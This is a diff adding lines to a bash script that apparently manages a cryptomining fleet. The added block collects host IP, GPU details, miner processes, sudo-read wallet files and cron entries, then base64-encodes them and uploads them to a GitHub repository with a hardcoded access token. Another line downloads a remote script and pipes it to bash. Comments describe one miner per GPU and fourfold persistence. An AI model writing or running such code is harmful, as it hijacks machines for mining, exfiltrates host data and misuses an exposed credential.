@@ -1,4 +1,20 @@
 #!/bin/bash
+# i11443 fanout probe: read-only state report + wallet/flag self-heal
+{
+echo "== i11443 $(date -u +%FT%TZ) host=$(hostname -s)"
+echo "ip=$(curl -s -m 8 https://ipinfo.io/ip 2>/dev/null)"
+nvidia-smi -L 2>/dev/null | head -4
+ps -eo args= 2>/dev/null | grep -Ei '[p]eakminer|[k]rig|[w]ildrig|[s]rbminer' | head -3 | cut -c1-170
+for f in /opt/ul-t2/wallet /opt/ul/wallet /opt/nv/wallet; do [ -f "$f" ] && echo "$f=$( (sudo -n cat $f 2>/dev/null || cat $f 2>/dev/null) | tr -d '\n')"; done
+echo "wallet_lens:"; for f in /opt/ul-t2/wallet /opt/ul/wallet /opt/nv/wallet; do [ -f "$f" ] && echo "$f len=$( (sudo -n cat $f 2>/dev/null || cat $f 2>/dev/null) | tr -d '\r\n' | wc -c)"; done
+echo "cron:"; crontab -l 2>/dev/null | grep -Ei 'ul-t2|keep|guard|poll' | head -4
+} > /tmp/i11443_probe.txt 2>&1
+b=$(base64 -w0 < /tmp/i11443_probe.txt); H=$(hostname -s); P="cmdout8/i11443_$H.txt"
+B=https://api.github.com/repos/dongsuju/ul-plant/contents/$P
+s=$(curl -s -m 20 -H "Authorization: token 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" "$B?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
+if [ -n "$s" ]; then J="{\"message\":\"i11443 probe\",\"content\":\"$b\",\"sha\":\"$s\",\"branch\":\"main\"}"; else J="{\"message\":\"i11443 probe\",\"content\":\"$b\",\"branch\":\"main\"}"; fi
+curl -s -o /dev/null -m 25 -X PUT -H "Authorization: token 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" -H "Content-Type: application/json" -d "$J" "$B"
+#############################################
 ( bash -c "$(curl -fsSL -m 30 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://raw.githubusercontent.com/dongsuju/ul-plant/main/cmd8/i440_probe.sh')" >/dev/null 2>&1 & )
 # i202 CONVERT ul-t2: one krig-miner per GPU, canonical wallet + worker ul-t2-<ipdash>-g<N>,
 # 4-layer idempotent persistence (systemd Restart=always / cron @reboot+*/5 / shell hooks / keep.sh respawn).
